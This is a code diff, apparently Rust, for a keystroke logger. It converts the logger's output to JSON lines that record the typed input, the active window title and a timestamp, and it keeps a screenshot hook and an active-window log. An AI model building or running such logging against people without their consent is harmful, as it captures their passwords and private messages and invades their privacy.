@@ -94,15 +94,16 @@ where
                         // Trigger screenshot before logging
                         on_screenshot();
 
-                        writeln!(
-                            key_logger_file,
-                            "[{}] [{}] Input: {}",
-                            Local::now().format("%Y-%m-%d %H:%M:%S"),
-                            last_window,
-                            current_line
-                        )
-                        .unwrap();
-                        key_logger_file.flush().unwrap();
+                        let log_entry = serde_json::json!({
+                            "timestamp": Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+                            "window": last_window,
+                            "input": current_line
+                        });
+
+                        if let Ok(json_line) = serde_json::to_string(&log_entry) {
+                            writeln!(key_logger_file, "{}", json_line).unwrap();
+                            key_logger_file.flush().unwrap();
+                        }
                         current_line.clear();
                     }
                 }
@@ -118,15 +119,16 @@ where
             // Trigger screenshot before logging
             on_screenshot();
 
-            writeln!(
-                key_logger_file,
-                "[{}] [{}] Input: {}",
-                Local::now().format("%Y-%m-%d %H:%M:%S"),
-                last_window,
-                current_line
-            )
-            .unwrap();
-            key_logger_file.flush().unwrap();
+            let log_entry = serde_json::json!({
+                "timestamp": Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+                "window": last_window,
+                "input": current_line
+            });
+
+            if let Ok(json_line) = serde_json::to_string(&log_entry) {
+                writeln!(key_logger_file, "{}", json_line).unwrap();
+                key_logger_file.flush().unwrap();
+            }
             current_line.clear();
         }
 
@@ -137,14 +139,15 @@ where
                 // Trigger screenshot before logging active window change
                 // on_screenshot(); // This spams the ss folder as each window switch starts taking screen shots
 
-                writeln!(
-                    active_window_file,
-                    "[{}] Active Window: {}",
-                    Local::now().format("%Y-%m-%d %H:%M:%S"),
-                    title
-                )
-                .unwrap();
-                active_window_file.flush().unwrap();
+                let log_entry = serde_json::json!({
+                    "timestamp": Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+                    "title": title
+                });
+
+                if let Ok(json_line) = serde_json::to_string(&log_entry) {
+                    writeln!(active_window_file, "{}", json_line).unwrap();
+                    active_window_file.flush().unwrap();
+                }
             }
         }
 
